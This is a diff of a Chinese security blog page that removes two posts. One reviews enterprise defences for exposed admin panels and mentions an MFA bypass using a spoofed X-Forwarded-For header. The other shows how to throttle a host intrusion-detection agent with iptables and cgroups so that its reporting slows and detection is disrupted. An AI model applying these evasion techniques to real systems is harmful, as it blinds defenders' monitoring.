-<h1 id="安全管理与技术"><a href="#安全管理与技术" class="headerlink" title="安全管理与技术"></a>安全管理与技术</h1><p>对于”管理后台对外开放”和”api接口未授权访问”这两类风险，在企业安全建设中是怎么防范的呢？</p>
-<ul>
-<li><p>怎么减少”管理后台对外”安全风险？</p>
-<p>根据个人有限的经验来总结，管理上包括如下手段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 公司发布安全红线：禁止后台开放到公网访问</span><br><span class="line">* 安全意识的宣导</span><br></pre></td></tr></table></figure>
-
-<p>技术上包括如下手段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 统一认证登陆</span><br><span class="line">* 周期性对资产做扫描，识别&quot;管理后台&quot;</span><br><span class="line">* 从流量层面识别&quot;管理后台&quot;</span><br></pre></td></tr></table></figure>
-
-<p>业务上包括如下手段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 后台访问白名单限制</span><br><span class="line">* 后台登陆多因素认证MFA（短信二次认证、rsa token等）</span><br></pre></td></tr></table></figure>
-
-<p>比如能看到的，滴滴很多后台管理业务都接入了统一认证登陆，对于我来说就比较难进一步测试。</p>
-<p>不过上面的手段都并不一定管用，各种手段自身也有设计缺陷、安全漏洞等。</p>
-<p>比如我前公司的统一认证平台 <a target="_blank" rel="noopener" href="https://passport.fangdd.com/public/login?url=https://passport.fangdd.com/password/resetingPage.do;jsessionid=88F109354741F07D5ED2004B1BB5E35C-n1">统一认证登陆</a> 出现过一个设计上的漏洞。</p>
-<p>正常的业务场景是：它支持钉钉登陆，员工在web页面输入邮箱后，钉钉app会收到一个确认登陆链接。员工点击确认链接后，web端就会验证通过，进入到后台系统。</p>
-<p>有白帽子收集一些部分员工邮箱，就在web页面填收集到的邮箱。结果有部分员工点击了钉钉上收到的”确认登陆链接”消息，帮助”攻击者”进到了后台系统。</p>
-<p>另外还听我同事给我分享的案例，他遇到某些有多因子认证的系统时，加x-forwarded-for请求头伪造内网ip就绕过去了，原因是面向内部的系统去掉了”多因子认证”。</p>
-<p>至于安全意识的宣导、安全红线到底有多大作用，这感觉更不好衡量。</p>
-</li>
-<li><p>怎么减少”api接口未授权访问”安全风险？</p>
-<p>根据个人有限的经验来总结，技术上包括以下手段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 依赖开发人员的代码安全质量</span><br><span class="line">* 零信任架构的实施</span><br></pre></td></tr></table></figure>
-
-<p>零信任应用的两个场景包括了 用户访问服务 和 服务之间互相访问 时的认证鉴权，而”用户登陆后台访问数据”恰好就是”用户访问服务”这个场景。</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>验证了这个老套路在国内还是能挖到洞的。</p>
-<p>站在攻击方的角度来看，现有每一步的安全策略可以优化，比如可以详细调研一下后台系统的分类，比如为什么开源的cms后台和前台经常是在一个域名下，而企业里的后台系统为什么经常是单独的访问方式？</p>
-<p>整个流程或许也可以优化到完全依赖工具产出报警，就像 <a target="_blank" rel="noopener" href="https://www.hackinn.com/index.php/archives/744/">一种针对Webpack等前端打包工具构建的网站的自动化测试思路（附开源项目）</a> 一样。虽然没有用过这个项目，但是看文章介绍感觉有不少实战上的细节和经验。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1220,171 +1278,6 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
 </ul>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>“.git”目录信息泄漏 + 人工代码审计 这个套路 现在感觉行不太通。</p>
 <p>另外有一个小问题：有师傅知道企业安全建设中怎么用威胁情报来拉黑ip的话，请公众号留言告诉我。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E9%99%90%E5%88%B6agent%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%B5%84%E6%BA%90%E4%BD%BF%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E9%99%90%E5%88%B6agent%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%B5%84%E6%BA%90%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">如何限制agent进程的资源使用</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WQeOfZtyKndbDebe66-V_g">如何避免文件上报-制作大文件</a> 问题背景中提到：agent会上报信息，甚至会上传文件。</p>
-<p>如果能够限制agent进程对系统资源的使用，是不是可能对”信息上报”造成影响。比如限制agent进程每秒只能读1字节的文件内容、限制agent上报文件带宽在1字节每秒、限制agent只能使用很少的cpu分片等等。</p>
-<p>本文记录对”限制资源使用”的实践：</p>
-<ul>
-<li>怎么限制进程的网络带宽</li>
-<li>怎么限制进程的io读速度</li>
-<li>怎么限制进程的cpu使用率</li>
-</ul>
-<p>“对进程资源的限制”有很多使用场景，比如我看到有人问 <a target="_blank" rel="noopener" href="https://github.com/Qianlitp/crawlergo/issues/22">怎么控制crawlergo爬虫的cpu和内存使用率</a>，再比如 hids本身也需要对cpu、内存等使用做限制。</p>
-<h1 id="agent进程带宽限速"><a href="#agent进程带宽限速" class="headerlink" title="agent进程带宽限速"></a>agent进程带宽限速</h1><ul>
-<li><p>为什么限速？</p>
-<p>如果能让agent进程每秒只能传输很少的字节数，就有可能拖慢agent上报信息的进度，从而干扰安全检测。重点是”网速变慢”能保证”agent心跳”能正常传到server，不至于在server端看到agent异常。</p>
-</li>
-<li><p>在linux主机上怎么给进程限流呢？</p>
-<p>调研总结有两种方式：</p>
-<blockquote>
-<p>cgroups + tc命令：可以实现对指定的进程限速</p>
-<p>iptables：可以实现对指定的tcp通信限速</p>
-</blockquote>
-</li>
-</ul>
-<h2 id="使用iptables对进程限速"><a href="#使用iptables对进程限速" class="headerlink" title="使用iptables对进程限速"></a>使用iptables对进程限速</h2><ul>
-<li><p>怎么用iptables对进程限速？</p>
-<p>可以使用iptables的limit模块来完成。</p>
-<p>根据<code>man iptables-extensions</code>手册可知：limit模块使用”令牌桶算法”实现。</p>
-<p><code>--limit-burst</code>参数指定初始令牌数，<code>--limit</code>参数指定补充令牌的速率。</p>
-<p>举个例子，下面命令可以对目标ip”1.2.3.4”端口为5001的tcp通信做限速：桶最大值也是初始值就是10个tcp包，每秒新增1个tcp包，所以发包速率峰值基本上可以认为是”10个包/每秒”；当客户端每秒有100个包要发出去时，基本上到后面发包速度会基本限制在”1个包/每秒”；</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# iptables -A OUTPUT -d 1.2.3.4&#x2F;32 -p tcp -m limit --limit 1&#x2F;sec --limit-burst 10 --dport 5001 -j ACCEPT</span><br><span class="line">[root@instance-fj5pftdp ~]# iptables -A OUTPUT -d 1.2.3.4&#x2F;32 -p tcp --dport 5001 -j DROP</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>实践验证限速效果</p>
-<p>准备两台机器：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* &#96;instance-fj5pftdp&#96;发包</span><br><span class="line">* &#96;1.2.3.4&#96;收包 (为了我避免暴露自己的虚机ip，这里用1.2.3.4代替)</span><br></pre></td></tr></table></figure>
-
-<p>在发包机器上 使用iptables限制通信，然后传输大文件，并使用tcpdump观察包速率</p>
-<p>第一步：设置iptables，指令如上</p>
-<p>第二步：传输大文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 使用&#96;truncate -s 1G bigfil&#96;创建&quot;稀疏文件&quot;</span><br><span class="line">* 使用&#96;nc 1.2.3.4 5001 &lt; bigfile&#96;传输文件</span><br></pre></td></tr></table></figure>
-
-<p>第三步：使用tcpdump观察包速率：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump -i eth0 &#39;port 5001 and ip dst 1.2.3.4&#39;</span><br><span class="line">22:52:00.743321 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [S], seq 2314647925, win 27200, options [mss 1360,sackOK,TS val 2324847321 ecr 0,nop,wscale 7], length 0</span><br><span class="line">22:52:00.780074 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], ack 1736746942, win 213, options [nop,nop,TS val 2324847358 ecr 3661297505], length 0</span><br><span class="line">22:52:00.780253 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 0:2696, ack 1, win 213, options [nop,nop,TS val 2324847358 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780516 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 2696:5392, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780533 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 5392:8088, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780538 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 8088:8192, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 104</span><br><span class="line">22:52:00.780571 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 8192:10888, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780587 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 10888:12236, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 1348</span><br><span class="line">22:52:00.816636 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 12236:14932, ack 1, win 213, options [nop,nop,TS val 2324847395 ecr 3661297542], length 2696</span><br><span class="line">22:52:00.816674 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 14932:17628, ack 1, win 213, options [nop,nop,TS val 2324847395 ecr 3661297542], length 2696</span><br><span class="line">22:52:02.513394 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 17628:18976, ack 1, win 213, options [nop,nop,TS val 2324849092 ecr 3661297578], length 1348</span><br><span class="line">22:52:02.786393 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 18976:20324, ack 1, win 213, options [nop,nop,TS val 2324849365 ecr 3661299275], length 1348</span><br><span class="line">22:52:04.485382 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 20324:21672, ack 1, win 213, options [nop,nop,TS val 2324851064 ecr 3661299548], length 1348</span><br><span class="line">22:52:04.759396 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 21672:23020, ack 1, win 213, options [nop,nop,TS val 2324851338 ecr 3661301247], length 1348</span><br><span class="line">22:52:06.457405 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 23020:24368, ack 1, win 213, options [nop,nop,TS val 2324853036 ecr 3661301521], length 1348</span><br><span class="line">22:52:07.205354 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 24368:25716, ack 1, win 213, options [nop,nop,TS val 2324853784 ecr 3661303219], length 1348</span><br><span class="line">22:52:07.953399 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 25716:27064, ack 1, win 213, options [nop,nop,TS val 2324854532 ecr 3661303967], length 1348</span><br><span class="line">22:52:09.651384 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 27064:28412, ack 1, win 213, options [nop,nop,TS val 2324856230 ecr 3661304715], length 1348</span><br><span class="line">22:52:09.924396 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 28412:29760, ack 1, win 213, options [nop,nop,TS val 2324856503 ecr 3661306413], length 1348</span><br><span class="line">22:52:11.621372 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 29760:31108, ack 1, win 213, options [nop,nop,TS val 2324858200 ecr 3661306686], length 1348</span><br><span class="line">22:52:11.894385 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 31108:32456, ack 1, win 213, options [nop,nop,TS val 2324858473 ecr 3661308383], length 1348</span><br><span class="line">22:52:13.593387 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 32456:33804, ack 1, win 213, options [nop,nop,TS val 2324860172 ecr 3661308656], length 1348</span><br></pre></td></tr></table></figure>
-<p>可以看到最开始<code>22:52:00</code>通过了10个包，然后大概每秒可以通过1个包。</p>
-</li>
-</ul>
-<h1 id="agent进程io读限速"><a href="#agent进程io读限速" class="headerlink" title="agent进程io读限速"></a>agent进程io读限速</h1><ul>
-<li><p>在linux主机上怎么给进程io读写限速呢？</p>
-<p>可以通过cgroup实现：cgroup是一种文件系统，可以用来限制cpu、内存、io等资源使用；cgroup也是docker的核心原理之一。</p>
-<p>cgroup有v1、v2两个版本，其中v1 只能限制”直接io”，v2版本对内核版本要求在4.5以上（似乎）。而hids等应用程序读文件大部分应该都是”缓冲io”，所以无法用v1版本的cgroup限制。我也只实验验证v1版本的对”直接io”的限制。</p>
-<blockquote>
-<p>如果想要了解更多”直接io”和”缓冲io”相关概念，可以参考 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/76876">23 | 基础篇：Linux 文件系统是怎么工作的？</a> 这篇。</p>
-</blockquote>
-<p>关于cgroup的介绍和使用可以参考网上的很多文章，比如 <a target="_blank" rel="noopener" href="https://tech.meituan.com/2015/03/31/cgroups.html">Linux资源管理之cgroups简介</a> 和 <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/cgroups.7.html">man手册</a></p>
-<p>“利用cgroup对进程io读写做限速”可以参考 <a target="_blank" rel="noopener" href="https://andrestc.com/post/cgroups-io/">Using cgroups to limit I/O</a>，这一篇文章有完整的实验过程。此小节我只记录”需要注意的细节”和文章没有提到的内容。</p>
-</li>
-</ul>
-<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><ul>
-<li><p>确认配置</p>
-<p>根据 <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/cgroup-v1/blkio-controller.txt">cgroup-v1文档</a> 手册说明，需要先确认内核是否支持cgroup io限速</p>
-<p>比如确认如下选项是否开启</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# cat &#x2F;boot&#x2F;config-$(uname -r)|grep -i CONFIG_BLK_CGROUP</span><br><span class="line">CONFIG_BLK_CGROUP&#x3D;y</span><br><span class="line">[root@instance-fj5pftdp ~]# cat &#x2F;boot&#x2F;config-$(uname -r)|grep -i CONFIG_BLK_DEV_THROTTLING</span><br><span class="line">CONFIG_BLK_DEV_THROTTLING&#x3D;y</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>dd命令需要添加<code>oflag=direct</code>参数和bs参数必须是512（一个扇区的大小）的倍数</p>
-<p>因为cgroup v1 只能限制”直接io”，所以dd需要添加<code>oflag=direct</code>参数。</p>
-<p>而使用”直接io”，磁盘io需要扇区对齐，也就是每次写入的字节大小必须是一个扇区大小的倍数。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;tmp&#x2F;file2 bs&#x3D;512 count&#x3D;1 oflag&#x3D;direct</span><br><span class="line">...</span><br><span class="line">512字节(512 B)已复制，0.00518424 秒，98.8 kB&#x2F;秒</span><br><span class="line">[root@instance-fj5pftdp ~]# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;tmp&#x2F;file2 bs&#x3D;511 count&#x3D;1 oflag&#x3D;direct   &#x2F;&#x2F; 非512倍数时，写入报错</span><br><span class="line">dd: 写入&quot;&#x2F;tmp&#x2F;file2&quot; 出错: 无效的参数</span><br><span class="line">...</span><br><span class="line">[root@instance-fj5pftdp ~]# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;tmp&#x2F;file2 bs&#x3D;511 count&#x3D;1    &#x2F;&#x2F; &quot;缓冲io&quot;（非&quot;直接io&quot;）时，不需要用户对齐</span><br><span class="line">...</span><br><span class="line">511字节(511 B)已复制，0.000360275 秒，1.4 MB&#x2F;秒</span><br></pre></td></tr></table></figure>
-
-<p>如果想要了解更多”磁盘io对齐”相关知识，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/rqq-GgZMMs5gj6p_VJqEVA">存储基础 —— 磁盘 IO 为什么总叫你对齐？</a> 这篇。</p>
-</li>
-<li><p>实验过程中遇到的报错</p>
-<p>在向配置中”写正在使用的分区”和”不正确的设备号”都会提示”无效的参数”报错，如下：</p>
-<p>似乎不能写正在使用的分区”/dev/vda1”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# df -h</span><br><span class="line">...</span><br><span class="line">&#x2F;dev&#x2F;vda1        79G   71G  4.6G  94% &#x2F;</span><br><span class="line">[root@instance-fj5pftdp ~]# cat &#x2F;proc&#x2F;partitions</span><br><span class="line">major minor  #blocks  name</span><br><span class="line"></span><br><span class="line"> 253        0   83886080 vda</span><br><span class="line"> 253        1   83885039 vda1</span><br><span class="line"></span><br><span class="line">[root@instance-fj5pftdp test1]# echo &#39;253:1 100&#39; &gt; blkio.throttle.read_bps_device   &#x2F;&#x2F; 253对应&#x2F;dev&#x2F;vda1，似乎因为已经被挂载使用，所以不能被写入配置</span><br><span class="line">-bash: echo: 写错误: 无效的参数</span><br><span class="line">[root@instance-fj5pftdp test1]# echo &#39;253:0 100&#39; &gt; blkio.throttle.read_bps_device</span><br></pre></td></tr></table></figure>
-
-<p>不能限制”字符设备”，只能限制”块设备”。当写入”字符设备的设备号”到配置时，就会报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;dev|grep &quot;5,&quot;</span><br><span class="line">crw-------  1 root root      5,   1 Apr 28 21:51 console</span><br><span class="line">crw-rw-rw-  1 root tty       5,   2 Oct 22 13:45 ptmx</span><br><span class="line">crw-rw-rw-  1 root tty       5,   0 Oct 12 13:06 tty</span><br><span class="line">[root@instance-fj5pftdp test1]# echo &#39;5:1 100&#39; &gt; blkio.throttle.read_bps_device   &#x2F;&#x2F; 5(主设备号)代表了&quot;字符设备&quot;</span><br><span class="line">-bash: echo: 写错误: 无效的参数</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="限制cpu使用"><a href="#限制cpu使用" class="headerlink" title="限制cpu使用"></a>限制cpu使用</h1><ul>
-<li><p>怎么限制cpu使用？</p>
-<p>同样使用cgroup。</p>
-</li>
-</ul>
-<h2 id="使用cgroup限制cpu使用"><a href="#使用cgroup限制cpu使用" class="headerlink" title="使用cgroup限制cpu使用"></a>使用cgroup限制cpu使用</h2><ul>
-<li><p>利用<code>stress</code>命令创建高cpu占用的”测试进程”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp test]# stress -c 1 &amp;</span><br><span class="line">[1] 27924</span><br><span class="line">[root@instance-fj5pftdp test]# stress: info: [27924] dispatching hogs: 1 cpu, 0 io, 0 vm, 0 hdd</span><br><span class="line"></span><br><span class="line">[root@instance-fj5pftdp test]# ps aux|grep stress</span><br><span class="line">root     27924  0.0  0.0   7312   424 pts&#x2F;65   S    23:02   0:00 stress -c 1</span><br><span class="line">root     27925 96.0  0.0   7312    96 pts&#x2F;65   R    23:02   0:10 stress -c 1    &#x2F;&#x2F; 实际工作的进程</span><br></pre></td></tr></table></figure>
-
-<p>验证cpu占用，可以看出来单核cpu占用100%</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp test]# top -b -p 27925</span><br><span class="line">...</span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line">27925 root      20   0    7312     96      0 R 100.0  0.0   2:32.58 stress</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>利用<code>cgroup</code>限制”测试进程”的使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# mkdir &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 27925 &gt; &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit&#x2F;tasks    &#x2F;&#x2F; 进程号是27925</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 10000 &gt; &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit&#x2F;cpu.cfs_quota_us   &#x2F;&#x2F; quota &#x3D; 10ms</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 50000 &gt; &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit&#x2F;cpu.cfs_period_us  &#x2F;&#x2F; period &#x3D; 50ms</span><br></pre></td></tr></table></figure>
-
-<p>限制cpu使用率是20%（10ms/50ms）</p>
-<p>查看是否限制stress进程</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# top -b -p 27925</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line">27925 root      20   0    7312     96      0 R  20.0  0.0   9:30.61 stress</span><br></pre></td></tr></table></figure>
-<p>可以看到限制成功</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>使用cgroup限制cpu、io等是很简单的。</p>
-<p>因为用cgroup”限制网络流量”没有测试成功，所以也就没有记录。</p>
-<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://qastack.cn/superuser/287371/obtain-kernel-config-from-currently-running-linux-system">怎么查看内核配置</a></p>
 
       
     </div>
